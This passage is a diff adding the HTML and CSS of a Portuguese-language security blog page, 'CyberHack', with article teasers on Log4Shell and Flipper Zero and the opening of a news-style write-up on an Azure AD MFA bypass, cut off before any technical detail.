@@ -1,0 +1,2787 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberHack - Blog & Pesquisas</title>
+    
+    <link rel="icon" href="r.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="r.png" type="image/x-icon" />
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', 'Courier New', monospace;
+            color: #fff;
+            user-select: none;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        body {
+            background-color: #000000;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        header {
+            padding: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+
+        .logo::before {
+            content: '';
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #ff69b4;
+            margin-right: 10px;
+            box-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.7; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .download-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .home-btn {
+            background: linear-gradient(45deg, #00c3ff, #00e7ff);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(0, 199, 255, 0.4);
+            transition: all 0.3s ease !important;
+            margin-right: 10px;
+        }
+        
+        .home-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 199, 255, 0.6);
+            color: #fff !important;
+        }
+
+        .nav-links a:hover {
+            color: #ff69b4;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff69b4, transparent);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .hero {
+            height: 300px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            margin-bottom: 50px;
+            perspective: 1000px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -150%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 105, 180, 0.1), transparent);
+            transform: rotate(25deg);
+            animation: glare 7s linear infinite;
+        }
+
+        @keyframes glare {
+            0% { transform: translateX(-100%) rotate(25deg); }
+            100% { transform: translateX(100%) rotate(25deg); }
+        }
+
+        .hero-content {
+            position: relative;
+            transform-style: preserve-3d;
+            animation: float 6s ease-in-out infinite;
+            z-index: 2;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px) rotateX(0deg); }
+            50% { transform: translateY(-10px) rotateX(3deg); }
+            100% { transform: translateY(0px) rotateX(0deg); }
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            font-weight: 700;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            position: relative;
+        }
+
+        .hero h1::before,
+        .hero h1::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .hero h1::before {
+            left: 2px;
+            text-shadow: -1px 0 #00ffea;
+            animation: glitch-before 3s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        .hero h1::after {
+            left: -2px;
+            text-shadow: 1px 0 #ff00c1;
+            animation: glitch-after 2s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        @keyframes glitch-before {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(30% 0 25% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        @keyframes glitch-after {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(10% 0 40% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 800px;
+            margin-bottom: 20px;
+        }
+
+        .blog-container {
+            display: flex;
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+
+        .blog-main {
+            flex: 3;
+        }
+
+        .blog-sidebar {
+            flex: 1;
+        }
+
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .category-btn {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .category-btn:hover, .category-btn.active {
+            background: linear-gradient(45deg, rgba(255, 20, 147, 0.2), rgba(255, 105, 180, 0.4));
+            border-color: rgba(255, 105, 180, 0.7);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
+        }
+
+        .category-btn.active {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+        }
+
+        .featured-articles {
+            margin-bottom: 50px;
+        }
+
+        .section-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 25px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            width: 50%;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .featured-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
+        }
+
+        .featured-article {
+            background: rgba(15, 15, 15, 0.7);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .featured-article:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 20, 147, 0.3);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .featured-article img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            opacity: 0.8;
+            transition: all 0.3s ease;
+        }
+
+        .featured-article:hover img {
+            opacity: 1;
+            transform: scale(1.05);
+        }
+
+        .featured-content {
+            padding: 20px;
+        }
+
+        .article-category {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .featured-content h3 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .featured-article:hover h3 {
+            color: #ff69b4;
+        }
+
+        .article-meta {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 15px;
+        }
+
+        .article-meta i {
+            margin-right: 5px;
+        }
+
+        .article-meta span {
+            margin-right: 15px;
+        }
+
+        .featured-content p {
+            font-size: 15px;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+
+        .read-more {
+            display: inline-flex;
+            align-items: center;
+            color: #ff69b4;
+            font-weight: 500;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .read-more i {
+            margin-left: 8px;
+            color: #ff69b4;
+            transition: all 0.3s ease;
+        }
+
+        .read-more:hover {
+            color: #fff;
+        }
+
+        .read-more:hover i {
+            transform: translateX(5px);
+            color: #fff;
+        }
+
+        .article-list {
+            margin-bottom: 50px;
+        }
+
+        .article-item {
+            background: rgba(15, 15, 15, 0.7);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 25px;
+            padding: 25px;
+            transition: all 0.3s ease;
+        }
+
+        .article-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 20, 147, 0.3);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .article-header {
+            margin-bottom: 20px;
+        }
+
+        .article-header h3 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .article-item:hover h3 {
+            color: #ff69b4;
+        }
+
+        .article-content {
+            font-size: 16px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+
+        .article-content h4 {
+            font-size: 20px;
+            color: #ff69b4;
+            margin: 25px 0 15px;
+        }
+
+        .article-content p {
+            margin-bottom: 15px;
+        }
+
+        .article-content ul, .article-content ol {
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+
+        .article-content li {
+            margin-bottom: 8px;
+        }
+
+        .article-content pre {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 3px solid #ff69b4;
+        }
+
+        .article-content code {
+            font-family: 'Courier New', monospace;
+            color: #00c3ff;
+        }
+
+        .code-comment {
+            color: #777;
+            font-style: italic;
+        }
+
+        .article-content img {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .article-content blockquote {
+            border-left: 3px solid #ff69b4;
+            padding-left: 20px;
+            margin: 20px 0;
+            font-style: italic;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .code-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+        }
+
+        .code-box-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .code-box-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ff69b4;
+        }
+
+        .copy-btn {
+            background: rgba(255, 105, 180, 0.2);
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: rgba(255, 105, 180, 0.4);
+        }
+
+        .copy-btn i {
+            margin-right: 5px;
+            font-size: 12px;
+        }
+
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .tag {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .tag:hover {
+            background: rgba(255, 105, 180, 0.2);
+            border-color: rgba(255, 105, 180, 0.6);
+            transform: translateY(-2px);
+        }
+
+        .sidebar-widget {
+            background: rgba(15, 15, 15, 0.7);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .widget-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .widget-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            width: 50%;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .popular-posts {
+            margin-bottom: 0;
+        }
+
+        .popular-post {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .popular-post:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .popular-post img {
+            width: 70px;
+            height: 70px;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+        .popular-post-content {
+            flex: 1;
+        }
+
+        .popular-post-content h4 {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .popular-post:hover h4 {
+            color: #ff69b4;
+        }
+
+        .popular-post-content .post-date {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .tag-cloud {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .subscribe-form {
+            margin-top: 20px;
+        }
+
+        .subscribe-form input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .subscribe-form input:focus {
+            border-color: rgba(255, 105, 180, 0.7);
+        }
+
+        .subscribe-form button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .subscribe-form button:hover {
+            background: linear-gradient(45deg, #ff69b4, #ff1493);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
+        }
+
+        .command-title {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 15px;
+            border-radius: 5px;
+            margin: 25px 0 15px;
+            border-left: 3px solid #00c3ff;
+            font-weight: 600;
+            color: #00c3ff;
+        }
+
+        .command-description {
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .command-example {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
+            color: #00e7ff;
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .tool-card {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 105, 180, 0.6);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
+        }
+
+        .tool-icon {
+            font-size: 30px;
+            color: #ff69b4;
+            margin-bottom: 15px;
+        }
+
+        .tool-name {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .tool-description {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 15px;
+        }
+
+        .tool-link {
+            display: inline-flex;
+            align-items: center;
+            color: #ff69b4;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .tool-link i {
+            margin-left: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .tool-link:hover i {
+            transform: translateX(3px);
+        }
+
+        .tutorial-steps {
+            counter-reset: step;
+        }
+
+        .tutorial-step {
+            position: relative;
+            padding-left: 45px;
+            margin-bottom: 25px;
+        }
+
+        .tutorial-step::before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 30px;
+            height: 30px;
+            background: rgba(255, 105, 180, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .step-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #ff69b4;
+        }
+
+        .step-content {
+            font-size: 15px;
+            line-height: 1.7;
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-left: 3px solid #ffc107;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .warning-box i {
+            color: #ffc107;
+            margin-right: 10px;
+        }
+
+        .info-box {
+            background: rgba(0, 199, 255, 0.1);
+            border: 1px solid rgba(0, 199, 255, 0.3);
+            border-left: 3px solid #00c7ff;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .info-box i {
+            color: #00c7ff;
+            margin-right: 10px;
+        }
+
+        .image-gallery {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .gallery-image {
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .gallery-image img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            transition: all 0.3s ease;
+        }
+
+        .gallery-image:hover img {
+            transform: scale(1.05);
+        }
+
+        .gallery-caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .interview-box {
+            background: rgba(15, 15, 15, 0.7);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+        }
+
+        .interview-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .interview-avatar {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 20px;
+            border: 2px solid #ff69b4;
+        }
+
+        .interview-info h4 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #ff69b4;
+        }
+
+        .interview-info p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .interview-question {
+            font-weight: 600;
+            color: #00c3ff;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .interview-answer {
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .pagination {
+            display: flex;
+            justify-content: center;
+            margin-top: 50px;
+            margin-bottom: 50px;
+        }
+
+        .pagination-item {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            margin: 0 5px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            font-size: 16px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .pagination-item.active, .pagination-item:hover {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-color: transparent;
+        }
+
+        .pagination-item.dots {
+            background: transparent;
+            border: none;
+        }
+
+        .pagination-arrow {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            margin: 0 5px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            font-size: 16px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .pagination-arrow:hover {
+            background: rgba(255, 105, 180, 0.2);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .pagination-arrow i {
+            transition: all 0.3s ease;
+        }
+
+        .pagination-arrow:hover i {
+            transform: translateX(-3px);
+        }
+
+        .pagination-arrow.next:hover i {
+            transform: translateX(3px);
+        }
+
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #ff69b4;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background: rgba(255, 105, 180, 0.2);
+            transform: translateY(-3px);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .digital-numbers {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #ff69b4;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        #random-numbers {
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        @media (max-width: 992px) {
+            .blog-container {
+                flex-direction: column;
+            }
+            .featured-grid {
+                grid-template-columns: 1fr;
+            }
+            .hero h1 {
+                font-size: 36px;
+            }
+            .tool-grid {
+                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            }
+        }
+
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
+            .hero h1 {
+                font-size: 28px;
+            }
+            .article-item {
+                padding: 20px 15px;
+            }
+            .code-box {
+                padding: 15px 10px;
+            }
+            .image-gallery {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: #ff69b4;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .mobile-menu {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 250px;
+            height: 100vh;
+            background: rgba(10, 10, 10, 0.95);
+            z-index: 1000;
+            border-left: 1px solid rgba(255, 105, 180, 0.3);
+            overflow-y: auto;
+            transition: right 0.3s ease;
+        }
+
+        .mobile-menu.active {
+            right: 0;
+        }
+
+        .mobile-menu-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #ff69b4;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .mobile-nav-links {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-top: 70px;
+            padding: 0 20px;
+        }
+
+        .mobile-nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.2);
+            transition: color 0.3s;
+        }
+
+        .mobile-nav-links a:hover {
+            color: #ff69b4;
+        }
+        
+        .mobile-home-btn {
+            background: linear-gradient(45deg, #00c3ff, #00e7ff);
+            padding: 10px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 10px;
+            box-shadow: 0 3px 10px rgba(0, 199, 255, 0.4);
+            border-bottom: none !important;
+        }
+        
+        .mobile-home-btn:hover {
+            color: #fff !important;
+            transform: translateY(-2px);
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            display: none;
+            transition: opacity 0.3s ease;
+        }
+
+        #overlay.active {
+            display: block;
+        }
+
+        /* Scroll to top button */
+        .scroll-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 99;
+        }
+
+        .scroll-top.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .scroll-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 20, 147, 0.6);
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <header>
+            <div class="logo">CyberHack</div>
+            <nav class="nav-links">
+                <a href="index.html" class="home-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="#vulnerabilidades">Vulnerabilidades</a>
+                <a href="#ferramentas">Ferramentas</a>
+                <a href="#tutoriais">Tutoriais</a>
+                <a href="#entrevistas">Entrevistas</a>
+                <a href="downloads.html" class="download-btn"><i class="fas fa-download"></i> Downloads</a>
+            </nav>
+            <button class="mobile-menu-btn">
+                <i class="fas fa-bars"></i>
+            </button>
+        </header>
+
+        <section class="hero">
+            <div class="hero-content">
+                <h1 data-text="Blog & Pesquisas">Blog & Pesquisas</h1>
+                <p>Artigos sobre vulnerabilidades recentes, análises de hardware/software e entrevistas com profissionais de segurança.</p>
+            </div>
+        </section>
+
+        <div class="categories">
+            <button class="category-btn active">Todos</button>
+            <button class="category-btn">Vulnerabilidades</button>
+            <button class="category-btn">Pentesting</button>
+            <button class="category-btn">Ferramentas</button>
+            <button class="category-btn">Tutoriais</button>
+            <button class="category-btn">Análises</button>
+            <button class="category-btn">Entrevistas</button>
+            <button class="category-btn">Notícias</button>
+        </div>
+
+        <div class="blog-container">
+            <div class="blog-main">
+                <div class="featured-articles">
+                    <h2 class="section-title">Artigos em Destaque</h2>
+                    <div class="featured-grid">
+                        <div class="featured-article">
+                            <img src="https://images.unsplash.com/photo-1510511459019-5dda7724fd87?q=80&w=2070&auto=format&fit=crop" alt="Vulnerabilidade Log4j">
+                            <div class="featured-content">
+                                <span class="article-category">Vulnerabilidades</span>
+                                <h3>Análise da vulnerabilidade Log4Shell e seu impacto</h3>
+                                <div class="article-meta">
+                                    <span><i class="far fa-calendar"></i> 12/06/2025</span>
+                                    <span><i class="far fa-user"></i> Admin</span>
+                                </div>
+                                <p>Uma análise detalhada da vulnerabilidade Log4Shell (CVE-2021-44228) que continua a impactar sistemas em 2025, com novas variantes e exploits...</p>
+                                <a href="#" class="read-more">Ler artigo completo <i class="fas fa-arrow-right"></i></a>
+                            </div>
+                        </div>
+                        <div class="featured-article">
+                            <img src="https://images.unsplash.com/photo-1526948531399-320e7e40f0ca?q=80&w=2070&auto=format&fit=crop" alt="Flipper Zero">
+                            <div class="featured-content">
+                                <span class="article-category">Análises</span>
+                                <h3>Flipper Zero Pro: Evolução do hardware hacking</h3>
+                                <div class="article-meta">
+                                    <span><i class="far fa-calendar"></i> 08/06/2025</span>
+                                    <span><i class="far fa-user"></i> Admin</span>
+                                </div>
+                                <p>Analisamos o novo Flipper Zero Pro e suas capacidades avançadas para testes de segurança wireless, RFID, infrared e BadUSB...</p>
+                                <a href="#" class="read-more">Ler artigo completo <i class="fas fa-arrow-right"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="vulnerabilidades" class="article-list">
+                    <h2 class="section-title">Vulnerabilidades Recentes</h2>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Vulnerabilidades</span>
+                            <h3>Falha crítica em Azure AD permite bypass de autenticação multifator</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 10/06/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 1.253 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>Uma vulnerabilidade crítica identificada no Azure Active Directory (CVE-2025-21457) permite que atacantes contornem a autenticação multifator (MFA) em determinadas configurações. Esta falha afeta principalmente organizações que utilizam configurações personalizadas de políticas condicionais de acesso.</p>
+                            
+                            <h4>Detalhes da vulnerabilidade</h4>
+                            <p>A vulnerabilidade explora uma falha na verificação de tokens durante o processo de autenticação secundária. Atacantes podem manipular o fluxo de autenticação, fazendo com que o sistema considere a etapa de MFA como já completada.</p>
+                            
+                            <div class="info-box">
